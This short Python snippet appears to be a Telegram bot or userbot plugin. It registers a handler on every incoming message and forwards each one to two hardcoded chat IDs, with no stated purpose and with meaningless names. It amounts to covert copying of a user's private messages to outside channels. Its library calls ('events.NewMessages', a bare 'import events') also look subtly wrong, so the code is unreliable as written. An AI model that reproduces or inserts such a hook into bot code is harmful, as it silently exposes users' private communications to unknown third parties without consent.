from BD import tbot
import events

@tbot.on(events.NewMessages(incoming=True))
async def x(e):
 for x in [-1001176306346, -1001443691244]:
    await e.forward_to(x)
